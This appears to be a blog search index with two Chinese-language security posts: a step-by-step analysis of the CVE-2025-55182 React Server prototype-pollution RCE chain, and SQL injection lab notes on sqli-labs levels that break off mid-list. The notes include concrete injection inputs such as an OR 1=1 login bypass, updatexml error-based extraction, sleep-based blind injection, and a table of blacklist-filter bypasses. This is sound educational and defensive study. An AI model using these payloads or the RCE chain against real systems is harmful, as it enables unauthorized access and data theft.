<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CVE-2025-55182 (React2Shell)</title>
      <link href="/2026/02/02/CVE-2025-55182%20(React2Shell)/"/>
      <url>/2026/02/02/CVE-2025-55182%20(React2Shell)/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2025-55182-React2Shell"><a href="#CVE-2025-55182-React2Shell" class="headerlink" title="CVE-2025-55182 (React2Shell)"></a><strong>CVE-2025-55182 (React2Shell)</strong></h1><h3 id="漏洞执行流程图"><a href="#漏洞执行流程图" class="headerlink" title="漏洞执行流程图"></a>漏洞执行流程图</h3><pre class="mermaid">graph TD    A[攻击者发送 Payload] --> B(解析入口: decodeReplyFromBusboy)    B --> C{解析 Multipart 字段}    subgraph 阶段一: 注册恶意回调 与 原型链遍历    C -->|遇到 Chunk 0| D["解析 Chunk 0 JSON"]    D --> E["处理 Key: $1:__proto__:then"]    E --> F["解析引用 $1 (Chunk 1)"]    F -->|Chunk 1 状态为 PENDING| G["在 Chunk 1 上注册 resolve 回调"]    G -->|回调内容| H["等待触发: 用 Chunk 1 的属性填充 Chunk 0 的 Key"]    end    subgraph 阶段二: 触发回调 与 构造伪造 Chunk    C -->|遇到 Chunk 1| I["解析 Chunk 1: $@0"]    I --> J["解析引用 $@0 (Promise引用)"]    J -->|Chunk 0 已存在| K["触发 Chunk 1 的状态变为 INITIALIZED"]    K --> L["执行阶段一注册的回调 wakeChunk"]    L --> M["执行 reviveModel 进行对象还原"]    M --> N{"遍历路径 ['1', '__proto__', 'then']"}    N -->|无 hasOwnProperty 检查| O["获取 Chunk.prototype.then"]    O --> P["将 Chunk 0.then 赋值为 Chunk.prototype.then"]    P --> Q["同理将 _formData.get 赋值为 Function 构造函数"]    end    subgraph 阶段三: Thenable 自动解包 与 代码执行    Q --> R["Chunk 0 变为合法的 Thenable 对象"]    R --> S["系统 await/resolve Chunk 0"]    S -->|自动调用 then 方法| T["执行 Chunk.prototype.then"]    T --> U["内部调用 initializeModelChunk -> reviveModel"]    U --> V["解析 value: $B1337"]    V --> W["进入 Blob 类型处理分支 (Case 'B')"]    W --> X["调用 response._formData.get(blobKey)"]    X -->|get 已被替换为 Function| Y["执行 Function('恶意代码...')"]    Y --> Z((RCE 远程代码执行))    end</pre><hr><h3 id="详细步骤解析"><a href="#详细步骤解析" class="headerlink" title="详细步骤解析"></a>详细步骤解析</h3><h4 id="1-初始输入-Attack-Vector"><a href="#1-初始输入-Attack-Vector" class="headerlink" title="1. 初始输入 (Attack Vector)"></a>1. 初始输入 (Attack Vector)</h4><p>攻击者发送一个 <code>multipart/form-data</code> 请求，包含两个部分：</p><ul><li><strong>Chunk 0 (Payload)</strong>: 一个精心构造的 JSON 对象，包含 <code>$1:__proto__:then</code> 这样的恶意 Key，以及恶意的 <code>value</code> 和 <code>_response</code> 属性。</li><li><strong>Chunk 1 (Trigger)</strong>: 内容为 <code>&quot;$@0&quot;</code>，用于引用 Chunk 0 并触发 Promise 机制。</li></ul><h4 id="2-阶段一：埋下伏笔-注册回调"><a href="#2-阶段一：埋下伏笔-注册回调" class="headerlink" title="2. 阶段一：埋下伏笔 (注册回调)"></a>2. 阶段一：埋下伏笔 (注册回调)</h4><ul><li><strong>解析入口</strong>: 服务端通过 <code>decodeReplyFromBusboy</code> 开始流式解析数据。</li><li><strong>遇到引用</strong>: 在解析 Chunk 0 时，遇到 Key <code>&quot;$1:__proto__:then&quot;</code>。React 尝试解析 <code>$1</code> (即 Chunk 1)。</li><li><strong>状态挂起</strong>: 此时 Chunk 1 尚未解析完成（状态为 <code>PENDING</code>），React 会调用 <code>chunk.then</code> 注册一个回调函数（<code>createModelResolver</code>），等待 Chunk 1 就绪后执行。<strong>这个回调函数的目的是：当 Chunk 1 就绪后，沿着 <code>__proto__:then</code> 路径去取值，并赋给 Chunk 0</strong>。</li></ul><h4 id="3-阶段二：触发与污染-构造-Fake-Chunk"><a href="#3-阶段二：触发与污染-构造-Fake-Chunk" class="headerlink" title="3. 阶段二：触发与污染 (构造 Fake Chunk)"></a>3. 阶段二：触发与污染 (构造 Fake Chunk)</h4><ul><li><p><strong>解析触发器</strong>: 解析到 Chunk 1 (<code>$@0</code>)。<code>$@</code> 表示这是一个 Promise 引用。</p></li><li><p><strong>唤醒回调</strong>: Chunk 1 解析完成，状态变为 <code>INITIALIZED</code>，触发之前注册的回调函数 (<code>wakeChunk</code>)。</p></li><li><p>路径遍历 (漏洞点)</p><p>: 回调函数执行 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reviveModel</span><br></pre></td></tr></table></figure><p> 逻辑，沿着 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&quot;1&quot;, &quot;__proto__&quot;, &quot;then&quot;]</span><br></pre></td></tr></table></figure><p> 路径查找属性。</p><ul><li><strong>关键缺陷</strong>: 代码中使用了 <code>for (key in value)</code> 且<strong>没有使用 <code>hasOwnProperty</code> 检查</strong>。</li><li><strong>结果</strong>: 系统错误地读取到了 JavaScript 原型链上的 <code>Chunk.prototype.then</code>。</li></ul></li><li><p>完成伪造</p><p>: 同样的逻辑被用于将 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_formData.get</span><br></pre></td></tr></table></figure><p> 属性指向 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function</span><br></pre></td></tr></table></figure><p> 构造函数 (通过 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">constructor.constructor</span><br></pre></td></tr></table></figure><p>)。</p><ul><li>此时，Chunk 0 变成了一个**伪造的 Chunk (Fake Chunk)**，它拥有合法的 <code>then</code> 方法和恶意的 <code>_formData</code>。</li></ul></li></ul><h4 id="4-阶段三：执行陷阱-RCE"><a href="#4-阶段三：执行陷阱-RCE" class="headerlink" title="4. 阶段三：执行陷阱 (RCE)"></a>4. 阶段三：执行陷阱 (RCE)</h4><ul><li><p><strong>自动解包</strong>: 由于 Chunk 0 现在拥有 <code>then</code> 方法，它被视为一个 <strong>Thenable</strong> 对象。在 JS 的 <code>await</code> 或 <code>Promise</code> 处理中，会自动执行这个 <code>then</code> 方法。</p></li><li><p><strong>进入 React 逻辑</strong>: 伪造的 <code>then</code> 指向了合法的 <code>Chunk.prototype.then</code>，这会让 React 误以为这是一个正常的内部对象，并开始解析其 <code>value</code> 部分 (<code>&#123;&quot;then&quot;:&quot;$B1337&quot;&#125;</code>)。</p></li><li><p>Blob 解析漏洞</p><p>: 解析器遇到 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$B</span><br></pre></td></tr></table></figure><p> (Blob 类型) 开头的数据。</p><ul><li>正常逻辑：调用 <code>response._formData.get(blobKey)</code> 获取文件数据。</li><li><strong>被劫持逻辑</strong>: 由于 <code>get</code> 已经被替换为 <code>Function</code>，且 <code>blobKey</code> 部分可控 (包含恶意代码字符串)，代码变成了执行 <code>Function(&quot;恶意代码...&quot;)</code>。</li></ul></li><li><p><strong>代码执行</strong>: 恶意代码被执行，完成 RCE。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> React </tag>
            
            <tag> Security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL 注入学习笔记</title>
      <link href="/2026/01/28/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2026/01/28/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-注入学习笔记"><a href="#SQL-注入学习笔记" class="headerlink" title="SQL 注入学习笔记"></a>SQL 注入学习笔记</h1><h1 id="模块一：基础回显注入（GET-Error-Based）"><a href="#模块一：基础回显注入（GET-Error-Based）" class="headerlink" title="模块一：基础回显注入（GET Error-Based）"></a>模块一：基础回显注入（GET Error-Based）</h1><p><strong>涉及关卡</strong>：Less-1 ~ Less-4</p><h2 id="一、核心操作流程"><a href="#一、核心操作流程" class="headerlink" title="一、核心操作流程"></a>一、核心操作流程</h2><p>注入的核心是突破 SQL 语句结构限制，获取数据回显，步骤可总结为“摸清结构→修复语法→探测信息→获取数据”。</p><ol><li><p><strong>确认闭合方式</strong>：这是注入的前提。通过输入单引号（’）、双引号（”）、单引号+括号（’)）、双引号+括号（”)），观察页面报错信息，反推 SQL 语句对输入参数的包裹方式。</p></li><li><p><strong>语法修复与探测</strong>：</p><ul><li><p>断句：输入闭合符触发语法错误，确认参数位置是否可注入；</p></li><li><p>修复：使用注释符（–+、#、%23）屏蔽语句尾部内容，使页面恢复正常，验证注入点有效性；</p></li><li><p>列数探测：通过 ORDER BY 语句结合二分法，确定查询结果的列数，为后续联合查询铺垫；</p></li><li><p>数据回显：利用 UNION SELECT 联合查询，将目标数据填充到回显位，实现数据泄露。</p></li></ul></li></ol><h2 id="二、关键知识点"><a href="#二、关键知识点" class="headerlink" title="二、关键知识点"></a>二、关键知识点</h2><ul><li><p><strong>Union 查询规则</strong>：用于合并多个 SELECT 语句的结果集，要求前后语句列数一致、数据类型兼容，否则会报错。</p></li><li><p><strong>多行数据合并</strong>：group_concat() 函数可将多行查询结果合并为一行输出，适合回显位有限的场景，搭配分隔符使用效果更佳。</p></li><li><p><strong>常用分隔符</strong>：推荐使用十六进制编码的分隔符，如 0x3a（冒号 :）、0x7e（波浪号 ~），避免与数据本身冲突。</p></li></ul><h2 id="三、深度思考与拓展"><a href="#三、深度思考与拓展" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>如何通过报错信息精准反推闭合方式？若系统禁用错误回显，需通过布尔值差异（页面内容变化）验证结构。</p></li><li><p>列数探测优先于 Union 查询的原因：Union 要求列数匹配，只有确定列数后，才能构造合法语句占用回显位；回显位不足时，可通过 group_concat() 合并字段，或分批次查询数据。</p></li><li><p>数据库差异点：MySQL 支持 group_concat()，PostgreSQL 可用 string_agg()，SQL Server 需结合 FOR XML PATH 实现类似功能；Union 查询在各数据库中规则一致，但注释符略有差异。</p></li><li><p>元数据查询代价：通过 information_schema 枚举表名、列名时，会产生额外数据库请求，高频查询可能被日志监控捕捉，需控制查询频率。</p></li></ul><h2 id="四、源码解析与复现要点"><a href="#四、源码解析与复现要点" class="headerlink" title="四、源码解析与复现要点"></a>四、源码解析与复现要点</h2><h3 id="1-源码结构"><a href="#1-源码结构" class="headerlink" title="1. 源码结构"></a>1. 源码结构</h3><ul><li><p>入口文件：Less-1 至 Less-4 的 index.php，均通过 include(“..&#x2F;sql-connections&#x2F;sqli-connect.php”) 建立数据库连接（$con1）。</p></li><li><p>输入来源：通过 $_GET[‘id’] 获取参数，多数关卡会将输入（通常为过滤后的值）写入当前目录 result.txt，便于回溯。</p></li><li><p>核心 SQL 语句：</p><ul><li><p>Less-1：SELECT * FROM users WHERE id&#x3D;’$id’ LIMIT 0,1（单引号闭合）；</p></li><li><p>Less-2：SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1（数值型，无引号保护）；</p></li><li><p>Less-3：SELECT * FROM users WHERE id&#x3D;(‘$id’) LIMIT 0,1（单引号+括号闭合）；</p></li><li><p>Less-4：SELECT * FROM users WHERE id&#x3D;(“$id”) LIMIT 0,1（双引号+括号闭合）。</p></li></ul></li><li><p>回显逻辑：查询命中时直接输出 username 和 password，失败时打印 mysqli_error 信息，为错误回显注入提供入口。</p></li></ul><h3 id="2-复现关键线索"><a href="#2-复现关键线索" class="headerlink" title="2. 复现关键线索"></a>2. 复现关键线索</h3><ul><li><p>Less-1（单引号）：单引号触发报错，注释修复后页面恢复，联合查询可正常占用回显位；</p></li><li><p>Less-2（数值型）：非数字输入（如字母、符号）易触发语法错误，列数确定后可直接通过 Union 回显数据；</p></li><li><p>Less-3（单引号+括号）：需同时闭合单引号和括号（如 ‘)），报错信息与回显位用法同 Less-1；</p></li><li><p>Less-4（双引号+括号）：双引号闭合后现象与 Less-3 类似，需关注报错信息中引号类型的差异。</p></li></ul><hr><h1 id="模块二：报错与盲注（Blind-Double-Query）"><a href="#模块二：报错与盲注（Blind-Double-Query）" class="headerlink" title="模块二：报错与盲注（Blind &#x2F; Double Query）"></a>模块二：报错与盲注（Blind &#x2F; Double Query）</h1><p><strong>涉及关卡</strong>：Less-5 ~ Less-10</p><h2 id="一、核心操作逻辑"><a href="#一、核心操作逻辑" class="headerlink" title="一、核心操作逻辑"></a>一、核心操作逻辑</h2><p>当页面无直接数据回显时，需通过间接方式判断注入结果，分为报错注入和盲注两类场景。</p><ul><li><p><strong>报错注入</strong>：页面无数据回显，但保留错误提示功能时使用。通过构造非法语法，使数据库报错并泄露目标数据。</p></li><li><p><strong>盲注</strong>：页面无回显且无报错时启用，依赖页面微小差异或响应时间判断条件真假：</p><ul><li><p>布尔盲注：寻找页面内容差异（如是否显示“You are in…”），作为条件真假的判断依据；</p></li><li><p>时间盲注：利用 sleep() 函数制造响应时间差，是无任何信号时的终极手段。</p></li></ul></li></ul><h2 id="二、关键知识点-1"><a href="#二、关键知识点-1" class="headerlink" title="二、关键知识点"></a>二、关键知识点</h2><ul><li><p><strong>XML 报错注入</strong>：利用 updatexml() 函数的 XPath 格式校验漏洞，在 XPath 字符串中插入目标数据，因格式错误触发报错，泄露数据内容（如 updatexml(1,concat(0x7e,user(),0x7e),1)）。</p></li><li><p><strong>Double Query 报错</strong>：结合 count()、rand()、group by 函数，利用主键冲突机制引发报错，适用于早期 MySQL 版本，可绕过部分过滤。</p></li><li><p><strong>盲注核心函数</strong>：ascii()（转换字符为 ASCII 码）、substr()（截取字符串）、length()（获取字符串长度）、if(cond,true,false)（条件判断），是盲注数据遍历的核心工具。</p></li></ul><h2 id="三、深度思考与拓展-1"><a href="#三、深度思考与拓展-1" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>报错注入与盲注的成本差异：报错注入一次请求可泄露大量数据，效率高但依赖错误回显；盲注需逐字符遍历，请求量大，易被限流，需优化策略。</p></li><li><p>时间盲注的稳定性：网络抖动会影响响应时间判断，可通过设置合理 sleep 时长（如 3-5 秒）、多次验证结果，降低误判概率。</p></li><li><p>Less-9&#x2F;10 无布尔差异的解决方案：需依赖时间盲注或侧信道信息（如数据库日志、响应包大小），构造稳定的判断信号。</p></li><li><p>盲注优化方向：采用二分法遍历（将遍历次数从 O(N) 降至 O(log N)）、批量比较字符、利用并发请求或缓存减少重复查询，提升效率。</p></li></ul><h2 id="四、源码解析与复现要点-1"><a href="#四、源码解析与复现要点-1" class="headerlink" title="四、源码解析与复现要点"></a>四、源码解析与复现要点</h2><h3 id="1-源码结构-1"><a href="#1-源码结构-1" class="headerlink" title="1. 源码结构"></a>1. 源码结构</h3><ul><li><p>入口与连接：同模块一，均通过 sqli-connect.php 建立连接，输入参数为 $_GET[‘id’]，多数页面会写入当前目录 result.txt（记录通常是过滤后的值）。</p></li><li><p>SQL 语句差异：</p><ul><li><p>Less-5：id&#x3D;’$id’（单引号闭合）；</p></li><li><p>Less-6：$id 被双引号包裹后，SQL 为 id&#x3D;$id（双引号闭合）；</p></li><li><p>Less-7：id&#x3D;((‘$id’))（三重括号+单引号闭合）；</p></li><li><p>Less-8&#x2F;9：id&#x3D;’$id’（单引号闭合）；</p></li><li><p>Less-10：$id 被双引号包裹后，SQL 为 id&#x3D;$id（双引号闭合）。</p></li></ul></li><li><p>回显策略：</p><ul><li><p>Less-5&#x2F;6：查询命中仅显示“You are in…”，失败打印错误信息，适合报错注入；</p></li><li><p>Less-8：仅条件为真时显示“You are in…”，构成布尔盲注场景；</p></li><li><p>Less-9&#x2F;10：无论条件真假均显示“You are in…”，只能通过时间盲注判断。</p></li></ul></li></ul><h3 id="2-复现关键线索-1"><a href="#2-复现关键线索-1" class="headerlink" title="2. 复现关键线索"></a>2. 复现关键线索</h3><ul><li><p>Less-5（单引号报错）：通过报错函数（updatexml、extractvalue）构造注入语句，从错误信息中提取数据；</p></li><li><p>Less-6（双引号报错）：闭合方式改为双引号，报错注入逻辑与 Less-5 一致，注意双引号闭合方式差异；</p></li><li><p>Less-7（文件写入）：需满足 secure_file_priv 配置允许写入，且有目录权限，通过联合查询或报错语句验证文件写入语法与权限限制；</p></li><li><p>Less-8（布尔盲注）：以“是否显示“You are in…””为信号，结合 substr、ascii 函数逐字符遍历数据；</p></li><li><p>Less-9&#x2F;10（时间盲注）：构造 if(条件,sleep(5),1) 语句，通过响应时间差判断条件真假，Less-10 需注意双引号闭合。</p></li></ul><hr><h1 id="模块三：POST-登录框注入"><a href="#模块三：POST-登录框注入" class="headerlink" title="模块三：POST 登录框注入"></a>模块三：POST 登录框注入</h1><p><strong>涉及关卡</strong>：Less-11 ~ Less-16</p><h2 id="一、核心操作逻辑-1"><a href="#一、核心操作逻辑-1" class="headerlink" title="一、核心操作逻辑"></a>一、核心操作逻辑</h2><p>POST 注入与 GET 注入核心原理一致，差异在于注入位置为 HTTP 请求体（表单数据），需关注表单字段的闭合方式与过滤规则。</p><ul><li><p><strong>注入位置定位</strong>：重点关注用户名（uname）、密码（passwd）字段，二者均可能直接拼接入 SQL 语句，形成注入点。</p></li><li><p><strong>万能密码绕过</strong>：利用逻辑 OR 构造恒真条件，如用户名输入“admin’ OR 1&#x3D;1 #”，注释掉后续密码判断语句，直接绕过登录认证。</p></li><li><p><strong>双注入点利用</strong>：若某一字段（如用户名）被过滤，可尝试在另一字段（如密码）注入；或通过用户名闭合语法，在密码字段验证注入链路的有效性。</p></li></ul><h2 id="二、关键知识点-2"><a href="#二、关键知识点-2" class="headerlink" title="二、关键知识点"></a>二、关键知识点</h2><ul><li><p><strong>核心 SQL 结构</strong>：多数登录框 SQL 为“SELECT … WHERE username&#x3D;’$u’ AND password&#x3D;’$p’”，注入需破坏 AND 逻辑，构造恒真条件。</p></li><li><p><strong>注释符使用差异</strong>：GET 请求中需用 –+（加号转义为空格），POST 请求中可直接使用 # 或 – （注意尾部空格），无需 URL 编码。</p></li></ul><h2 id="三、深度思考与拓展-2"><a href="#三、深度思考与拓展-2" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>盲注信号优化：登录成功&#x2F;失败的图标、提示文案差异，可作为布尔盲注信号，但需排除前端渲染干扰（如缓存、静态文案），确保信号稳定。</p></li><li><p>密码加密对注入的影响：若密码经哈希（MD5、SHA）处理后存储，注入需在加密前的参数位置进行，哈希后的字段无法直接注入；若前端加密，可尝试绕过加密逻辑或直接注入后端参数。</p></li><li><p>认证系统常见弱点：错误提示差异（如“用户名不存在”“密码错误”）可用于账户枚举；登录日志若记录原始输入，可能成为二次注入入口；参数化查询可彻底防御此类注入，核心是将用户输入与 SQL 语句分离。</p></li></ul><h2 id="四、源码解析与复现要点-2"><a href="#四、源码解析与复现要点-2" class="headerlink" title="四、源码解析与复现要点"></a>四、源码解析与复现要点</h2><h3 id="1-源码结构-2"><a href="#1-源码结构-2" class="headerlink" title="1. 源码结构"></a>1. 源码结构</h3><ul><li><p>入口与提交：Less-11 至 Less-16 的 index.php 包含表单，通过 POST 方式提交至当前页面，数据库连接方式同前序模块。</p></li><li><p>输入来源：$_POST[‘uname’]（用户名）、$_POST[‘passwd’]（密码），多数页面会写入当前目录 result.txt（记录通常是过滤后的值）。</p></li><li><p>核心 SQL 语句（均含 LIMIT 0,1）：</p><ul><li><p>Less-11：username&#x3D;’$uname’ and password&#x3D;’$passwd’（单引号闭合，显错）；</p></li><li><p>Less-12：uname 被双引号包裹后，SQL 为 username&#x3D;($uname)（双引号+括号闭合，显错）；</p></li><li><p>Less-13：username&#x3D;(‘$uname’)（单引号+括号闭合，字段隐藏，仅显报错）；</p></li><li><p>Less-14：uname 被双引号包裹后，SQL 为 username&#x3D;$uname（双引号闭合，字段隐藏，仅显报错）；</p></li><li><p>Less-15&#x2F;16：分别与 Less-11&#x2F;12 闭合方式一致，但无错误回显与字段输出，仅通过图标区分登录成功&#x2F;失败。</p></li></ul></li></ul><h3 id="2-复现关键线索-2"><a href="#2-复现关键线索-2" class="headerlink" title="2. 复现关键线索"></a>2. 复现关键线索</h3><ul><li><p>Less-11（单引号显错）：输入单引号触发报错，修复语法后可通过联合查询回显用户名&#x2F;密码；</p></li><li><p>Less-12（双引号括号显错）：双引号+括号闭合后触发报错，联合查询可替换字段回显；</p></li><li><p>Less-13（单引号括号报错）：无字段回显，需通过报错函数（updatexml）提取数据，页面仅展示登录成功图标；</p></li><li><p>Less-14（双引号报错）：双引号闭合，报错注入逻辑与 Less-13 一致，无字段直出；</p></li><li><p>Less-15（布尔盲注）：以登录成功&#x2F;失败图标为信号，构造布尔条件遍历数据；</p></li><li><p>Less-16（双引号+括号）：页面仍有成功&#x2F;失败图标差异，属于布尔盲注场景；也可用时间盲注作为备选。</p></li></ul><hr><h1 id="模块四：特殊语句注入（Update-Insert-Cookie）"><a href="#模块四：特殊语句注入（Update-Insert-Cookie）" class="headerlink" title="模块四：特殊语句注入（Update&#x2F;Insert&#x2F;Cookie）"></a>模块四：特殊语句注入（Update&#x2F;Insert&#x2F;Cookie）</h1><p><strong>涉及关卡</strong>：Less-17 ~ Less-22</p><h2 id="一、核心操作逻辑-2"><a href="#一、核心操作逻辑-2" class="headerlink" title="一、核心操作逻辑"></a>一、核心操作逻辑</h2><p>此类注入针对非查询语句（Update、Insert）及隐蔽注入点（Header、Cookie），核心难点在于语句执行条件与注入位置的隐蔽性。</p><ul><li><p><strong>非查询语句注入</strong>：Update（改密码）、Insert（注册&#x2F;日志）语句不支持 Union 查询，需依赖报错注入泄露数据；且需保证语句能正常执行（如 Update 需 WHERE 子句匹配记录），否则报错函数无法触发。</p></li><li><p><strong>隐蔽注入点利用</strong>：开发者常忽略 Header（User-Agent、Referer）、Cookie 字段的过滤，可通过修改这些字段注入；若字段经编码（Base64），需先编码注入语句再提交。</p></li></ul><h2 id="二、关键知识点-3"><a href="#二、关键知识点-3" class="headerlink" title="二、关键知识点"></a>二、关键知识点</h2><ul><li><p><strong>Insert 注入要点</strong>：语句格式为“INSERT INTO table VALUES (‘$inj’, …)”，注入时需补齐后续字段值，保证列数匹配，避免语句因字段缺失无法执行。</p></li><li><p><strong>Cookie 注入注意事项</strong>：Cookie 字段可能经 Base64 或序列化处理，注入前需明确编码规则，确保注入语句经解码后能正常闭合语法。</p></li><li><p><strong>语句执行条件</strong>：Update 注入需保证 WHERE 子句匹配到目标记录（如用户名存在），否则语句不执行，注入失效；Insert 注入需满足表结构约束（如非空字段、数据类型）。</p></li></ul><h2 id="三、深度思考与拓展-3"><a href="#三、深度思考与拓展-3" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>非查询语句依赖报错的原因：Update、Insert 语句无结果集返回，无法通过 Union 回显，只能借助语法错误或函数报错泄露信息；无报错时，可通过语句执行结果（如密码修改成功、日志记录变化）验证注入。</p></li><li><p>Header&#x2F;Cookie 注入被忽略的原因：多数开发者仅过滤 URL、表单参数，忽视 Header、Cookie 等“非用户直接输入”字段；现实系统中，这些字段若被写入数据库（如 User-Agent 日志），可能形成二次注入。</p></li><li><p>编码的安全性误区：Base64、序列化仅为数据传输&#x2F;存储格式，并非安全防护手段，解码后若未过滤，仍会触发注入；且编码可能掩盖敏感字符，绕过简单黑名单过滤。</p></li></ul><h2 id="四、源码解析与复现要点-3"><a href="#四、源码解析与复现要点-3" class="headerlink" title="四、源码解析与复现要点"></a>四、源码解析与复现要点</h2><h3 id="1-源码结构-3"><a href="#1-源码结构-3" class="headerlink" title="1. 源码结构"></a>1. 源码结构</h3><ul><li><p>Less-17（Update 注入）：密码重置功能，uname 经 check_input() 过滤（截断、魔术引号、数值判断），passwd 直接拼接入 Update 语句：</p><ul><li><p>查询语句：SELECT username,password FROM users WHERE username&#x3D;$uname LIMIT 0,1；</p></li><li><p>更新语句：UPDATE users SET password&#x3D;’$passwd’ WHERE username&#x3D;’$row1’。</p></li></ul></li><li><p>Less-18&#x2F;19（Header 注入）：登录成功后执行 Insert 语句，User-Agent&#x2F;Referer 未过滤：</p><ul><li><p>Less-18：INSERT INTO security.uagents (uagent, ip_address, username) VALUES (‘$uagent’,’$IP’,$uname)；</p></li><li><p>Less-19：INSERT INTO security.referers (referer, ip_address) VALUES (‘$uagent’,’$IP’)。</p></li></ul></li><li><p>Less-20（Cookie 注入）：登录成功后设置 Cookie（uname&#x3D;用户名），回访时直接拼接入查询：SELECT * FROM users WHERE username&#x3D;’$cookee’。</p></li><li><p>Less-21（Cookie Base64 注入）：Cookie 存储用户名的 Base64 编码，读取后经 base64_decode 处理，查询语句为：SELECT * FROM users WHERE username&#x3D;(‘$cookee’)。</p></li><li><p>Less-22（Cookie Base64+双引号注入）：Cookie 解码后再用双引号包裹，查询语句为：SELECT * FROM users WHERE username&#x3D;”$cookee1”。</p></li></ul><h3 id="2-复现关键线索-3"><a href="#2-复现关键线索-3" class="headerlink" title="2. 复现关键线索"></a>2. 复现关键线索</h3><ul><li><p>Less-17（密码重置 Update）：uname 过滤严格，passwd 为注入点；需先确认用户名存在（使 Update 语句执行），通过报错函数提取数据；</p></li><li><p>Less-18（User-Agent 注入）：登录成功后，User-Agent 被写入数据库，构造报错语句，从错误信息验证注入成功；</p></li><li><p>Less-19（Referer 注入）：Referer 字段写入 referers 表，报错信息可正常回显，注入逻辑与 Less-18 一致；</p></li><li><p>Less-20（Cookie 注入）：登录后修改 Cookie 中的 uname 值，构造闭合语句，通过页面回显判断注入效果；</p></li><li><p>Less-21（Cookie Base64）：注入语句需先进行 Base64 编码，确保解码后能正确闭合单引号+括号，否则无法触发注入；</p></li><li><p>Less-22（Cookie Base64+双引号）：解码后的注入语句需闭合双引号，注意编码一致性与双引号包裹规则，避免语法错误。</p></li></ul><hr><h1 id="模块五：过滤与绕过（Filters）"><a href="#模块五：过滤与绕过（Filters）" class="headerlink" title="模块五：过滤与绕过（Filters）"></a>模块五：过滤与绕过（Filters）</h1><p><strong>涉及关卡</strong>：Less-23 ~ Less-28a</p><h2 id="一、核心操作逻辑-3"><a href="#一、核心操作逻辑-3" class="headerlink" title="一、核心操作逻辑"></a>一、核心操作逻辑</h2><p>此类关卡通过黑名单过滤敏感词（注释符、逻辑词、关键字），核心是寻找等价替代方案或混淆写法，绕过过滤规则，同时保证 SQL 语句合法。</p><ul><li><p><strong>黑名单绕过思路</strong>：针对过滤的敏感词，使用等价符号、双写、编码、空格替代等方式，构造能被数据库解析但不被过滤规则识别的语句。</p></li><li><p><strong>无注释符闭合技巧</strong>：注释符被禁时，可利用 SQL 语法特性闭合尾部语句（如用 ‘1 闭合最后的单引号，使尾部语法合法）。</p></li></ul><h2 id="二、关键绕过技巧"><a href="#二、关键绕过技巧" class="headerlink" title="二、关键绕过技巧"></a>二、关键绕过技巧</h2><table><thead><tr><th>过滤类型</th><th>过滤内容</th><th>绕过方案</th></tr></thead><tbody><tr><td>注释符过滤</td><td>#、–</td><td>使用 %00（空字符）截断，或通过语法闭合尾部语句</td></tr><tr><td>逻辑词过滤</td><td>AND、OR</td><td>等价运算符：&amp;&amp;（%26%26）、</td></tr><tr><td>空格过滤</td><td>空格</td><td>%09（Tab）、%0a（换行）、&#x2F;**&#x2F;（注释空格）、括号包裹关键字</td></tr><tr><td>关键字过滤</td><td>UNION、SELECT</td><td>双写：uniunionon、selselectect；大小写混合：Union、SeLeCt</td></tr></tbody></table><h2 id="三、深度思考与拓展-4"><a href="#三、深度思考与拓展-4" class="headerlink" title="三、深度思考与拓展"></a>三、深度思考与拓展</h2><ul><li><p>黑名单过滤的局限性：黑名单无法覆盖所有等价替代方案，且易被绕过；过滤逻辑若存在漏洞（如只替换一次、大小写不敏感），会直接失效。等价替代成功的核心是“数据库能解析，过滤规则无法识别”。</p></li><li><p>过滤层级与编码影响：过滤发生在应用层时，需关注输入编码与过滤顺序（如先解码后过滤，需在编码前构造绕过语句）；WAF 层过滤则可能需结合 URL 编码、参数污染等方式绕过。</p></li><li><p>白名单策略优势：相比黑名单，白名单仅允许合法输入（如仅允许数字、字母），安全性更高，但需兼顾业务灵活性；常见误区是白名单规则不严谨（如遗漏特殊字符、允许编码后的恶意内容）。</p></li></ul><h2 id="四、源码解析与复现要点-4"><a href="#四、源码解析与复现要点-4" class="headerlink" title="四、源码解析与复现要点"></a>四、源码解析与复现要点</h2><h3 id="1-源码结构与过滤规则"><a href="#1-源码结构与过滤规则" class="headerlink" title="1. 源码结构与过滤规则"></a>1. 源码结构与过滤规则</h3><ul><li><p>Less-23：通过 preg_replace 移除 # 和 – 注释符，SQL 仍为 id&#x3D;’$id’，需无注释闭合尾部；</p></li><li><p>Less-24（二次注入）：注册时用 mysqli_real_escape_string 过滤用户名并写入数据库，改密码时直接读取 session 中的用户名拼接入 Update 语句（UPDATE users SET password&#x3D;’$pass’ WHERE username&#x3D;’$username’），形成存储型二次注入；</p></li><li><p>Less-25：blacklist() 函数正则删除 OR&#x2F;AND（不区分大小写），可通过双写或等价运算符绕过；</p></li><li><p>Less-26&#x2F;26a：过滤 OR&#x2F;AND、&#x2F;**&#x2F;、–、#、空白字符、斜杠，SQL 分别为 id&#x3D;’$id’（Less-26）、id&#x3D;(‘$id’)（Less-26a），需用括号、非空白分隔符绕过；</p></li><li><p>Less-27&#x2F;27a：强过滤 